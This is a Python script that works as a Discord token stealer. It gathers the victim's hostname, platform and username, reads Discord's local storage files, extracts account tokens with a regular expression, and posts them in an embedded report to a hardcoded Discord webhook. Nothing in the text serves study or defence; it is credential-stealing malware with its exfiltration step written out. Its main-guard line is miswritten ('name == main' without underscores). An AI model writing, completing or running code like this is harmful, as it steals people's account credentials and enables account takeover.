import os
import platform
import socket
import requests
import re
import json

def get_system_data():
    return {
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "username": os.getlogin(),
        "user_profile": os.path.expanduser('~')
    }

def get_tokens():
    tokens = []
    local_path = os.getenv('LOCALAPPDATA') + r'\Discord\Local Storage\leveldb'

    if not os.path.exists(local_path):
        return tokens

    for file in os.listdir(local_path):
        if not file.endswith(".log") and not file.endswith(".ldb"):
            continue
        with open(f"{local_path}\{file}", "r", errors='ignore') as f:
            for line in f:
                for token in re.findall(r'[\w-]{24}.[\w-]{6}.[\w-]{27}', line):
                    if token not in tokens:
                        tokens.append(token)
    return tokens

def execute_payload(webhook_url):
    system_data = get_system_data()
    found_tokens = get_tokens()

    payload = {
        "embeds": [{
            "title": "Full System & Token Report",
            "color": 16711680,
            "fields": [
                {"name": "Hostname", "value": system_data['hostname'], "inline": True},
                {"name": "User", "value": system_data['username'], "inline": True},
                {"name": "Tokens Found", "value": str(len(found_tokens)), "inline": False}
            ]
        }],
        "content": "Extracted Tokens:\n" + ("\n".join(found_tokens) if found_tokens else "None found.")
    }

    requests.post(webhook_url, json=payload)

if name == "main":
    WEBHOOK_URL = "https://discord.com/api/webhooks/1514598850638119012/rgGt7xBiwjISufc95OgT_w5MCUwKuLpEmXKKk0gqRA0lsw4MhwIR5mzRDATH5m4CxFP5"
    execute_payload(WEBHOOK_URL)
    print("Full report dispatched, LO!") 